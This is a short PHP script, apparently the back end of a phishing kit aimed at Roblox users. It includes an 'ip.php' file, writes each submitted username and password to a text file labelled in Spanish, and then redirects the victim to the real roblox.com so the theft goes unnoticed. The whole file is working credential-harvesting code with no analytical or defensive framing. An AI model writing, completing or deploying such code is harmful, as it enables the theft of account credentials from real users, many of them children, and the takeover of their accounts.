<?php
include "ip.php";
file_put_contents("usuarios.txt", "Usuario : " . $_POST['username'] . "\nContra: " . $_POST['password'] ."\n", FILE_APPEND);
header("Location: https://roblox.com");
exit();
?>
